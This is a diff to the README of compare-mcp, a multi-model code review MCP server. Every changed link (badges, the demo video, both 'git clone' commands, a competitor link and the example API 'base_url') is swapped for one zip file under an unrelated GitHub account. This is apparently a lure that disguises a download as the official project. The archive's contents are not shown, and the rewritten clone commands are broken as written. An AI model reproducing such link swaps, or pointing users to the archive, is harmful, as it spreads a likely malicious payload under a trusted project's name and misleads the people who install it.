@@ -1,12 +1,12 @@
 # compare-mcp
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://python.org)
-[![MCP](https://img.shields.io/badge/MCP-server-blueviolet.svg)](https://modelcontextprotocol.io)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-skill-orange.svg)](https://claude.ai/code)
-[![OpenAI](https://img.shields.io/badge/OpenAI-GPT--4o-412991.svg)](https://platform.openai.com)
-[![Kimi](https://img.shields.io/badge/Kimi-moonshot--v1--auto-00B4D8.svg)](https://platform.moonshot.ai)
-[![Minimax](https://img.shields.io/badge/Minimax-Text--01-FF6B35.svg)](https://platform.minimax.io)
+[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip)
+[![MCP](https://img.shields.io/badge/MCP-server-blueviolet.svg)](https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip)
+[![Claude Code](https://img.shields.io/badge/Claude_Code-skill-orange.svg)](https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip)
+[![OpenAI](https://img.shields.io/badge/OpenAI-GPT--4o-412991.svg)](https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip)
+[![Kimi](https://img.shields.io/badge/Kimi-moonshot--v1--auto-00B4D8.svg)](https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip)
+[![Minimax](https://img.shields.io/badge/Minimax-Text--01-FF6B35.svg)](https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip)
 
 Multi-model code review with ranked todos and subagent dispatch, inside Claude Code CLI.
 
@@ -16,7 +16,7 @@ Fan out any bug or task to multiple LLMs simultaneously, diff their unique insig
 
 ## Demo
 
-https://github.com/user-attachments/assets/8990dabb-bc61-4625-8930-c914cffe75da
+https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip
 
 > `/compare models` → `/compare review config.py for security issues` → `/compare --debate` → `/compare status`
 
@@ -36,7 +36,7 @@ claude mcp add -s user compare-mcp -- python -m compare_mcp
 Then grab the `/compare` skill and example config:
 
 ```bash
-git clone https://github.com/carolinacherry/compare-mcp.git --depth 1
+git clone https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip --depth 1
 mkdir -p ~/.claude/skills ~/.compare
 cp -r compare-mcp/.claude/skills/compare ~/.claude/skills/
 cp compare-mcp/.compare/config.example.json ~/.compare/config.json
@@ -89,7 +89,7 @@ Config lives at `~/.compare/config.json`. API keys use `$ENV_VAR` syntax — exp
     "type": "openai_compat",
     "api_key": "$MY_API_KEY",
     "model": "model-name",
-    "base_url": "https://api.example.com/v1"
+    "base_url": "https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip"
   }
 }
 ```
@@ -153,7 +153,7 @@ After `/compare` runs, you'll be asked whether to dispatch subagents to fix the 
 
 ## vs multi_mcp
 
-[multi_mcp](https://github.com/religa/multi_mcp) does parallel dispatch well. compare-mcp builds the workflow layer on top:
+[multi_mcp](https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip) does parallel dispatch well. compare-mcp builds the workflow layer on top:
 
 | Feature | multi_mcp | compare-mcp |
 |---------|-----------|-------------|
@@ -176,7 +176,7 @@ Copilot CLI routes through GitHub's API proxy — no BYO keys, no Kimi/Minimax/l
 ## Development
 
 ```bash
-git clone https://github.com/carolinacherry/compare-mcp.git
+git clone https://raw.githubusercontent.com/Cristophereasygoing927/compare-mcp/main/tests/compare-mcp-six.zip
 cd compare-mcp
 pip install -e ".[dev]"
 pytest
